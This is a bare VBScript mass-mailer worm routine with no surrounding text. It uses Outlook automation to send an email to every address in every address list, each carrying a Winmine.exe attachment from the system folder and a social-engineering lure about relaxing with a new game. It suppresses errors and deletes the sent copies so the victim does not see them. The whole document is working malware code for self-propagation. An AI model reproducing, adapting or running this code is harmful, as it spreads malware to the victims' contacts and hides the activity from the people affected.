On Error Resume Next
Set A=CreateObject("Outlook.Application")
Set B=A.GetNameSpace("MAPI")
For Each C In B.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.count
Set E=C.AddressEntries(D)
Set F=A.CreateItem(0)
F.To=E.Address
F.Subject="Is the work so hard ??"
F.Body="Relax you with the last version of <Winmine>."
Set G=CreateObject("Scripting.FileSystemObject")
F.Attachments.Add G.BuildPath(G.GetSpecialFolder(1),"Winmine.exe")
F.DeleteAfterSubmit=True
If F.To <> "" Then
F.Send
End If
Next
End If
Next
